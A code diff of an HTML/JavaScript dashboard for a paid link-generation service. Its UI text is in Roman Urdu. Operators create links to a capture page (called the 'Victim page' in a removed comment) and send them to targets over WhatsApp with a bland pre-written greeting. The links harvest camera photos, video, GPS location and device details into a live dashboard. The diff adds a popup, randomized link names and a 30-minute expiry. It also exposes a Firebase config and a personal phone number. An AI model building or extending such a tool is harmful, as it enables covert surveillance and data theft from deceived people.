@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ur">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
@@ -73,16 +73,14 @@
   .usage-fill.warn{background:linear-gradient(90deg,var(--gold),#f97316);}
   .usage-fill.danger{background:linear-gradient(90deg,var(--danger),#dc2626);}
   .feature-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(150px,1fr));gap:12px;}
-  .feature-btn{background:var(--glass);border:1px solid var(--border);border-radius:18px;padding:22px 14px;cursor:pointer;transition:0.25s;text-align:center;color:#fff;display:flex;flex-direction:column;align-items:center;gap:10px;font-family:inherit;}
+  .feature-btn{background:var(--glass);border:1px solid var(--border);border-radius:18px;padding:22px 14px;cursor:pointer;transition:0.25s;text-align:center;color:#fff;display:flex;flex-direction:column;align-items:center;gap:10px;font-family:inherit;position:relative;}
   .feature-btn:hover:not(:disabled){background:var(--glass-2);border-color:var(--accent);transform:translateY(-5px);}
   .feature-btn:disabled{opacity:0.5;cursor:not-allowed;}
   .feature-btn .fb-icon{width:54px;height:54px;border-radius:15px;background:linear-gradient(135deg,rgba(34,211,238,0.15),rgba(168,85,247,0.15));border:1px solid rgba(34,211,238,0.25);display:flex;align-items:center;justify-content:center;font-size:1.6rem;}
   .feature-btn .fb-title{font-weight:700;font-size:0.92rem;font-family:'Space Grotesk',sans-serif;}
   .feature-btn .fb-desc{font-size:0.7rem;opacity:0.55;}
-  .link-output{background:linear-gradient(135deg,rgba(34,211,238,0.08),rgba(168,85,247,0.08));border:1px solid rgba(34,211,238,0.3);border-radius:16px;padding:18px;margin-top:16px;}
-  .link-output .lo-label{font-size:0.72rem;text-transform:uppercase;letter-spacing:0.1em;opacity:0.8;margin-bottom:10px;font-weight:700;color:var(--accent);}
-  .link-row{display:flex;gap:10px;}
-  .link-row input{margin:0;font-size:0.82rem;font-family:'Space Grotesk',monospace;background:rgba(0,0,0,0.5);}
+  .feature-btn .fb-spinner{position:absolute;top:12px;right:12px;width:18px;height:18px;border:2px solid rgba(34,211,238,0.2);border-top-color:var(--accent);border-radius:50%;animation:spin 0.8s linear infinite;}
+  @keyframes spin{to{transform:rotate(360deg);}}
   .stats{display:grid;grid-template-columns:repeat(auto-fit,minmax(110px,1fr));gap:12px;}
   .stat-box{background:linear-gradient(160deg,rgba(34,211,238,0.08),rgba(168,85,247,0.08));border:1px solid rgba(34,211,238,0.2);border-radius:16px;padding:16px 12px;text-align:center;}
   .stat-box h3{font-family:'Space Grotesk',sans-serif;font-size:1.65rem;color:var(--accent);}
@@ -105,13 +103,12 @@
   .toast.show{opacity:1;transform:translateY(0);}
   .toast.error{background:linear-gradient(135deg,var(--danger),#b91c1c);box-shadow:0 16px 40px rgba(239,68,68,0.5);}
   .toast.info{background:linear-gradient(135deg,var(--accent),var(--accent-2));color:#000;}
-  .modal{position:fixed;inset:0;background:rgba(0,0,0,0.96);display:none;align-items:center;justify-content:center;z-index:500;padding:20px;}
+  .modal{position:fixed;inset:0;background:rgba(0,0,0,0.85);display:none;align-items:center;justify-content:center;z-index:500;padding:20px;backdrop-filter:blur(10px);}
   .modal.active{display:flex;}
   .modal-content{max-width:100%;max-height:90vh;border-radius:16px;overflow:hidden;}
   .modal-content img{max-width:100%;max-height:90vh;display:block;border-radius:16px;}
   .modal-close{position:absolute;top:16px;right:16px;width:44px;height:44px;border-radius:12px;background:rgba(255,255,255,0.15);color:#fff;font-size:1.3rem;border:1px solid rgba(255,255,255,0.25);cursor:pointer;}
   .spinner{width:44px;height:44px;border:4px solid rgba(34,211,238,0.15);border-top-color:var(--accent);border-radius:50%;animation:spin 0.9s linear infinite;margin:0 auto 16px;}
-  @keyframes spin{to{transform:rotate(360deg);}}
   .tabs{display:flex;gap:6px;background:rgba(0,0,0,0.4);border-radius:14px;padding:6px;margin-bottom:20px;border:1px solid var(--border);}
   .tab{flex:1;padding:11px;border-radius:10px;background:transparent;border:none;color:var(--text-dim);font-weight:600;font-size:0.88rem;cursor:pointer;transition:0.25s;font-family:inherit;}
   .tab.active{background:linear-gradient(135deg,var(--accent),var(--accent-2));color:#000;}
@@ -124,6 +121,25 @@
   .how-to-use h3{font-family:'Space Grotesk',sans-serif;font-size:0.95rem;margin-bottom:10px;color:var(--accent-3);display:flex;align-items:center;gap:8px;}
   .how-to-use ol{padding-left:20px;}
   .how-to-use li{margin-bottom:6px;opacity:0.85;}
+
+  /* ====== LINK POPUP MODAL ====== */
+  .link-popup{position:fixed;inset:0;background:rgba(0,0,0,0.85);backdrop-filter:blur(12px);display:none;align-items:center;justify-content:center;z-index:600;padding:20px;}
+  .link-popup.active{display:flex;}
+  .link-popup-inner{background:linear-gradient(160deg,rgba(20,26,53,0.98),rgba(10,14,31,0.98));border:1px solid rgba(34,211,238,0.4);border-radius:24px;padding:28px 22px;max-width:440px;width:100%;box-shadow:0 30px 80px rgba(34,211,238,0.3);animation:popIn 0.4s cubic-bezier(0.34,1.56,0.64,1);position:relative;}
+  @keyframes popIn{0%{transform:scale(0.8);opacity:0}100%{transform:scale(1);opacity:1}}
+  .link-popup-icon{width:70px;height:70px;border-radius:20px;background:linear-gradient(135deg,var(--accent),var(--accent-2));display:flex;align-items:center;justify-content:center;font-size:2rem;margin:0 auto 16px;box-shadow:0 16px 40px rgba(34,211,238,0.4);}
+  .link-popup h3{font-family:'Space Grotesk',sans-serif;font-size:1.2rem;text-align:center;margin-bottom:6px;}
+  .link-popup p{text-align:center;font-size:0.82rem;opacity:0.7;margin-bottom:20px;line-height:1.5;}
+  .link-name-box{background:rgba(0,0,0,0.4);border:1px solid rgba(34,211,238,0.3);border-radius:14px;padding:14px 16px;margin-bottom:14px;display:flex;justify-content:space-between;align-items:center;gap:10px;}
+  .link-name-box .ln-label{font-size:0.65rem;text-transform:uppercase;letter-spacing:0.1em;opacity:0.6;font-weight:700;}
+  .link-name-box .ln-value{font-family:'Space Grotesk',monospace;font-size:1.05rem;color:var(--accent);font-weight:700;letter-spacing:0.05em;}
+  .link-timer{background:linear-gradient(135deg,rgba(251,191,36,0.1),rgba(251,191,36,0.05));border:1px solid rgba(251,191,36,0.35);border-radius:12px;padding:12px;margin-bottom:14px;text-align:center;}
+  .link-timer .lt-label{font-size:0.7rem;text-transform:uppercase;letter-spacing:0.1em;opacity:0.75;font-weight:700;color:var(--gold);}
+  .link-timer .lt-time{font-family:'Space Grotesk',monospace;font-size:1.3rem;color:var(--gold);font-weight:700;margin-top:2px;}
+  .link-url-box{background:rgba(0,0,0,0.5);border:1px solid rgba(34,211,238,0.25);border-radius:12px;padding:12px 14px;margin-bottom:16px;font-family:'Space Grotesk',monospace;font-size:0.75rem;color:var(--accent);word-break:break-all;max-height:70px;overflow-y:auto;line-height:1.4;}
+  .link-popup-close{position:absolute;top:14px;right:14px;width:36px;height:36px;border-radius:10px;background:rgba(255,255,255,0.08);color:#fff;font-size:1rem;border:1px solid rgba(255,255,255,0.15);cursor:pointer;display:flex;align-items:center;justify-content:center;}
+  .link-popup-close:hover{background:rgba(239,68,68,0.3);}
+
   @media (max-width:480px){.hero h1{font-size:1.55rem;}.card{padding:18px;border-radius:18px;}.feature-grid{grid-template-columns:repeat(2,1fr);gap:10px;}.media-grid{grid-template-columns:repeat(2,1fr);}.feature-btn{padding:18px 10px;}.feature-btn .fb-icon{width:46px;height:46px;font-size:1.35rem;}}
 </style>
 </head>
@@ -200,10 +216,11 @@
     <h3>📖 Kaise Use Karein</h3>
     <ol>
       <li>Neeche se koi feature select karo (Camera, Location, etc.)</li>
-      <li>Unique link generate hoga</li>
+      <li>Ek link popup me khulega — 30 minute tak valid</li>
       <li>Link copy karke client ko bhejo (WhatsApp/Email)</li>
       <li>Client link kholega → permission dega → data aapke paas aayega</li>
-      <li>Captured data neeche "Captured Data" section me live dikhega</li>
+      <li>30 min baad link automatic expire ho jayega (safety ke liye)</li>
+      <li>Naya link banane ke liye phir button dabao</li>
     </ol>
   </div>
 
@@ -216,18 +233,11 @@
     <h2>🎯 Create Link</h2>
     <p style="opacity:0.65;font-size:0.82rem;margin-bottom:16px;line-height:1.5;">Feature select karo → link generate hoga → client ko bhejo.</p>
     <div class="feature-grid" id="featureGrid">
-      <button class="feature-btn" onclick="generateLink('camera')"><div class="fb-icon">📷</div><div class="fb-title">Camera</div><div class="fb-desc">Photo capture</div></button>
-      <button class="feature-btn" onclick="generateLink('video')"><div class="fb-icon">🎥</div><div class="fb-title">Video</div><div class="fb-desc">Video recording</div></button>
-      <button class="feature-btn" onclick="generateLink('location')"><div class="fb-icon">📍</div><div class="fb-title">Location</div><div class="fb-desc">GPS tracking</div></button>
-      <button class="feature-btn" onclick="generateLink('device')"><div class="fb-icon">📱</div><div class="fb-title">Device Info</div><div class="fb-desc">Phone details</div></button>
-      <button class="feature-btn" onclick="generateLink('all')"><div class="fb-icon">⚡</div><div class="fb-title">Full Access</div><div class="fb-desc">Sab kuch</div></button>
-    </div>
-    <div id="linkOutput" class="link-output hidden">
-      <div class="lo-label" id="linkLabel">Generated Link</div>
-      <div class="link-row">
-        <input type="text" id="generatedLink" readonly>
-        <button class="primary small" onclick="copyGeneratedLink()">📋 Copy</button>
-      </div>
+      <button class="feature-btn" onclick="generateLink('camera', this)"><div class="fb-icon">📷</div><div class="fb-title">Camera</div><div class="fb-desc">Photo capture</div></button>
+      <button class="feature-btn" onclick="generateLink('video', this)"><div class="fb-icon">🎥</div><div class="fb-title">Video</div><div class="fb-desc">Video recording</div></button>
+      <button class="feature-btn" onclick="generateLink('location', this)"><div class="fb-icon">📍</div><div class="fb-title">Location</div><div class="fb-desc">GPS tracking</div></button>
+      <button class="feature-btn" onclick="generateLink('device', this)"><div class="fb-icon">📱</div><div class="fb-title">Device Info</div><div class="fb-desc">Phone details</div></button>
+      <button class="feature-btn" onclick="generateLink('all', this)"><div class="fb-icon">⚡</div><div class="fb-title">Full Access</div><div class="fb-desc">Sab kuch</div></button>
     </div>
   </div>
 
@@ -283,6 +293,34 @@
   </div>
 </div>
 
+<!-- Link Popup Modal -->
+<div class="link-popup" id="linkPopup">
+  <div class="link-popup-inner">
+    <button class="link-popup-close" onclick="closeLinkPopup()">✕</button>
+    <div class="link-popup-icon">✅</div>
+    <h3 id="popupTitle">Link Ready!</h3>
+    <p>Ye link client ko bhejo — 30 minute tak valid hai</p>
+
+    <div class="link-name-box">
+      <div>
+        <div class="ln-label">Link Name</div>
+        <div class="ln-value" id="popupLinkName">abc123xy</div>
+      </div>
+    </div>
+
+    <div class="link-timer">
+      <div class="lt-label">⏱️ Expires In</div>
+      <div class="lt-time" id="popupTimer">30:00</div>
+    </div>
+
+    <div class="link-url-box" id="popupUrl"></div>
+
+    <button class="primary block" onclick="copyPopupLink()" style="margin-bottom:10px;font-size:1rem;padding:15px;">📋 Copy Link</button>
+    <button class="secondary block" onclick="shareWhatsApp()" style="margin-bottom:10px;">💬 WhatsApp par Share</button>
+    <button class="secondary block" onclick="closeLinkPopup()">Band Karo</button>
+  </div>
+</div>
+
 <div class="modal" id="modal" onclick="closeModal(event)">
   <button class="modal-close" onclick="closeModal()">✕</button>
   <div class="modal-content" id="modalContent"></div>
@@ -291,7 +329,7 @@
 <script type="module">
 import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-app.js";
 import { getAuth, createUserWithEmailAndPassword, signInWithEmailAndPassword, signOut, onAuthStateChanged, updateProfile, GoogleAuthProvider, signInWithPopup } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-auth.js";
-import { getFirestore, collection, addDoc, getDocs, deleteDoc, doc, query, where, serverTimestamp, getDoc, setDoc, updateDoc, increment, onSnapshot } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-firestore.js";
+import { getFirestore, collection, addDoc, getDocs, deleteDoc, doc, query, where, serverTimestamp, getDoc, setDoc, updateDoc, increment, onSnapshot, Timestamp } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-firestore.js";
 
 /* ========== CONFIG ========== */
 const firebaseConfig = {
@@ -303,10 +341,11 @@ const firebaseConfig = {
   appId: "1:108149086619:web:63f17a58695f1d7a1e293e"
 };
 
-const WHATSAPP_NUMBER = "923084191378";  // ✅ Aapka number
+const WHATSAPP_NUMBER = "923084191378";
 const PRO_PRICE = "1500";
 const FREE_TRIAL_LIMIT = 3;
-const CAPTURE_PAGE = "capture.html";   // Victim page file name
+const CAPTURE_PAGE = "capture.html";
+const LINK_EXPIRY_MINUTES = 30;
 
 /* ========== INIT ========== */
 const app = initializeApp(firebaseConfig);
@@ -316,6 +355,8 @@ const db = getFirestore(app);
 let currentUser = null;
 let userData = null;
 let liveUnsubscribe = null;
+let currentPopupLink = null;
+let popupTimerInterval = null;
 
 /* ========== HELPERS ========== */
 window.showToast = function(msg, isError = false, isInfo = false) {
@@ -338,6 +379,18 @@ window.switchAuth = function(mode) {
   document.getElementById("tabRegister").classList.toggle("active", mode === "register");
   document.getElementById("loginForm").classList.toggle("hidden", mode !== "login");
   document.getElementById("registerForm").classList.toggle("hidden", mode !== "register");
+}
+
+/* ========== RANDOM NAME GENERATOR ========== */
+function generateRandomName() {
+  const adjectives = ["swift","smart","bold","cool","rapid","sharp","prime","flash","neon","cyber","epic","nova","pulse","prime"];
+  const nouns = ["tiger","hawk","wolf","lion","fox","panther","falcon","viper","dragon","phoenix","storm","blaze","spark","bolt"];
+  const adj = adjectives[Math.floor(Math.random()*adjectives.length)];
+  const noun = nouns[Math.floor(Math.random()*nouns.length)];
+  const num = Math.floor(Math.random()*9000)+1000;
+  const rand1 = Math.random().toString(36).slice(2,5);
+  const rand2 = Math.random().toString(36).slice(2,5);
+  return `${adj}-${noun}-${num}-${rand1}${rand2}`;
 }
 
 /* ========== REGISTER ========== */
@@ -393,7 +446,7 @@ window.doLogin = async function() {
   }
 }
 
-/* ========== GOOGLE LOGIN ========== */
+/* ========== GOOGLE ========== */
 window.doGoogleLogin = async function() {
   const provider = new GoogleAuthProvider();
   provider.setCustomParameters({ prompt: 'select_account' });
@@ -472,7 +525,6 @@ function updateNavUser(user, data) {
   document.getElementById("planIndicator").innerHTML = `<span class="plan-badge ${planClass}">${planLabel}</span>`;
 }
 
-/* ========== PLAN CARD ========== */
 function renderPlanCard() {
   const card = document.getElementById("usageContent");
   if (!userData) return;
@@ -509,15 +561,26 @@ function updateFeatureButtons() {
   document.querySelectorAll("#featureGrid .feature-btn").forEach(btn => { btn.disabled = isTrialExhausted; });
 }
 
-/* ========== GENERATE LINK ========== */
-window.generateLink = async function(feature) {
+/* ========== GENERATE LINK - NEW VERSION ========== */
+window.generateLink = async function(feature, btnEl) {
   if (!currentUser || !userData) return showToast("Login karo pehle", true);
   if (userData.plan === "trial" && (userData.linksUsed || 0) >= FREE_TRIAL_LIMIT) {
     showToast("Trial khatam! Pro me upgrade karo.", true);
     openUpgrade();
     return;
   }
-  const linkId = Math.random().toString(36).slice(2, 12);
+
+  // Show spinner in button
+  if (btnEl) {
+    btnEl.disabled = true;
+    const sp = document.createElement("div");
+    sp.className = "fb-spinner";
+    btnEl.appendChild(sp);
+  }
+
+  const linkId = generateRandomName();
+  const expiresAt = new Date(Date.now() + LINK_EXPIRY_MINUTES * 60 * 1000);
+
   try {
     await setDoc(doc(db, "links", linkId), {
       ownerId: currentUser.uid,
@@ -525,43 +588,99 @@ window.generateLink = async function(feature) {
       ownerName: userData.name,
       feature,
       createdAt: serverTimestamp(),
-      used: false
+      expiresAt: Timestamp.fromDate(expiresAt),
+      used: false,
+      expired: false
     });
+
     await updateDoc(doc(db, "users", currentUser.uid), { linksUsed: increment(1) });
     userData.linksUsed = (userData.linksUsed || 0) + 1;
 
     const base = location.origin + location.pathname.replace(/[^/]*$/, "");
     const url = `${base}${CAPTURE_PAGE}#v=${linkId}`;
 
-    document.getElementById("linkLabel").textContent = `${feature.toUpperCase()} Link Ready`;
-    document.getElementById("generatedLink").value = url;
-    document.getElementById("linkOutput").classList.remove("hidden");
-    showToast("Link generate ho gaya! 📋");
+    currentPopupLink = { url, linkId, feature, expiresAt };
+
+    // Open popup
+    openLinkPopup(linkId, feature, url, expiresAt);
 
     renderPlanCard();
     updateFeatureButtons();
   } catch (e) {
     showToast("Link create nahi hua: " + e.message, true);
+    console.error(e);
+  } finally {
+    if (btnEl) {
+      btnEl.disabled = false;
+      const sp = btnEl.querySelector(".fb-spinner");
+      if (sp) sp.remove();
+    }
   }
 }
 
-window.copyGeneratedLink = function() {
-  const inp = document.getElementById("generatedLink");
-  inp.select();
-  document.execCommand("copy");
-  showToast("Link copy ho gaya! 📋");
+/* ========== LINK POPUP ========== */
+function openLinkPopup(linkId, feature, url, expiresAt) {
+  document.getElementById("popupTitle").textContent = `${feature.toUpperCase()} Link Ready!`;
+  document.getElementById("popupLinkName").textContent = linkId;
+  document.getElementById("popupUrl").textContent = url;
+  document.getElementById("linkPopup").classList.add("active");
+
+  // Start countdown
+  if (popupTimerInterval) clearInterval(popupTimerInterval);
+  updatePopupTimer(expiresAt);
+  popupTimerInterval = setInterval(() => updatePopupTimer(expiresAt), 1000);
 }
 
-/* ========== UPGRADE / WHATSAPP ========== */
+function updatePopupTimer(expiresAt) {
+  const el = document.getElementById("popupTimer");
+  if (!el) return;
+  const diff = expiresAt.getTime() - Date.now();
+  if (diff <= 0) {
+    el.textContent = "EXPIRED";
+    el.style.color = "#ef4444";
+    clearInterval(popupTimerInterval);
+    return;
+  }
+  const mins = Math.floor(diff / 60000);
+  const secs = Math.floor((diff % 60000) / 1000);
+  el.textContent = `${String(mins).padStart(2,'0')}:${String(secs).padStart(2,'0')}`;
+}
+
+window.closeLinkPopup = function() {
+  document.getElementById("linkPopup").classList.remove("active");
+  if (popupTimerInterval) clearInterval(popupTimerInterval);
+}
+
+window.copyPopupLink = function() {
+  if (!currentPopupLink) return;
+  navigator.clipboard.writeText(currentPopupLink.url).then(() => {
+    showToast("✅ Link copy ho gaya!");
+  }).catch(() => {
+    // Fallback
+    const ta = document.createElement("textarea");
+    ta.value = currentPopupLink.url;
+    document.body.appendChild(ta);
+    ta.select();
+    document.execCommand("copy");
+    document.body.removeChild(ta);
+    showToast("✅ Link copy ho gaya!");
+  });
+}
+
+window.shareWhatsApp = function() {
+  if (!currentPopupLink) return;
+  const msg = `Assalam o Alaikum!\n\nYe link open karein:\n${currentPopupLink.url}\n\nShukriya!`;
+  window.open(`https://wa.me/?text=${encodeURIComponent(msg)}`, "_blank");
+}
+
+/* ========== UPGRADE ========== */
 window.openUpgrade = function() { showView("upgradeView"); }
 window.closeUpgrade = function() { showView("dashboardView"); }
-
 window.openWhatsApp = function() {
   const name = userData?.name || currentUser?.displayName || "User";
   const email = currentUser?.email || "";
   const msg = `Assalam o Alaikum!\n\nMain Pro plan lena chahta hoon.\n\n👤 Naam: ${name}\n📧 Email: ${email}\n💎 Plan: Pro\n💰 Price: ${PRO_PRICE} PKR / month\n\nPlease payment details bhejein.`;
-  const url = `https://wa.me/${WHATSAPP_NUMBER}?text=${encodeURIComponent(msg)}`;
-  window.open(url, "_blank");
+  window.open(`https://wa.me/${WHATSAPP_NUMBER}?text=${encodeURIComponent(msg)}`, "_blank");
 }
 
 /* ========== LIVE LISTENER ========== */
@@ -574,7 +693,6 @@ function startLiveListener() {
   }, (err) => console.error("Live error:", err));
 }
 
-/* ========== STATS ========== */
 async function loadUserStats() {
   if (!currentUser) return;
   try {
@@ -589,7 +707,6 @@ async function loadUserStats() {
   } catch (e) { console.error(e); }
 }
 
-/* ========== RENDER MEDIA ========== */
 window.renderMedia = async function() {
   if (!currentUser) return;
   const grid = document.getElementById("mediaGrid");
@@ -607,25 +724,20 @@ function renderMediaFromSnap(snap) {
   const grid = document.getElementById("mediaGrid");
   let items = snap.docs.map(d => ({ id: d.id, ...d.data() }));
   items.sort((a,b) => (b.timestamp?.seconds||0) - (a.timestamp?.seconds||0));
-
   const search = (document.getElementById("searchBox")?.value || "").toLowerCase();
   if (search) items = items.filter(i => JSON.stringify(i).toLowerCase().includes(search));
-
   if (items.length === 0) {
     grid.innerHTML = `<p style="grid-column:1/-1;text-align:center;opacity:0.5;padding:30px;">Abhi koi data nahi aaya.<br><span style="font-size:0.8rem;opacity:0.7;">Link client ko bhejo aur wait karo.</span></p>`;
     return;
   }
-
   grid.innerHTML = items.map(i => {
     let thumb = "";
     if (i.photo) thumb = `<img src="${i.photo}" onclick="viewMedia('${i.id}')" loading="lazy">`;
     else if (i.type === "location") thumb = `<div style="aspect-ratio:1;display:flex;align-items:center;justify-content:center;font-size:2.5rem;background:rgba(34,211,238,0.1);">📍</div>`;
     else if (i.type === "device") thumb = `<div style="aspect-ratio:1;display:flex;align-items:center;justify-content:center;font-size:2.5rem;background:rgba(168,85,247,0.1);">📱</div>`;
     else thumb = `<div style="aspect-ratio:1;display:flex;align-items:center;justify-content:center;font-size:2.5rem;">📎</div>`;
-
     const time = i.timestamp ? new Date(i.timestamp.seconds*1000).toLocaleString() : "";
     const loc = i.location ? `${i.location.lat?.toFixed(3)}, ${i.location.lon?.toFixed(3)}` : "";
-
     return `
       <div class="media-card">
         ${thumb}
@@ -649,9 +761,7 @@ window.viewMedia = async function(id) {
     if (!snap.exists()) return;
     const data = snap.data();
     const content = document.getElementById("modalContent");
-    content.innerHTML = data.photo
-      ? `<img src="${data.photo}">`
-      : `<pre style="color:#fff;padding:20px;max-width:90vw;overflow:auto;font-size:0.8rem;">${JSON.stringify(data, null, 2)}</pre>`;
+    content.innerHTML = data.photo ? `<img src="${data.photo}">` : `<pre style="color:#fff;padding:20px;max-width:90vw;overflow:auto;font-size:0.8rem;">${JSON.stringify(data, null, 2)}</pre>`;
     document.getElementById("modal").classList.add("active");
   } catch (e) { console.error(e); }
 }
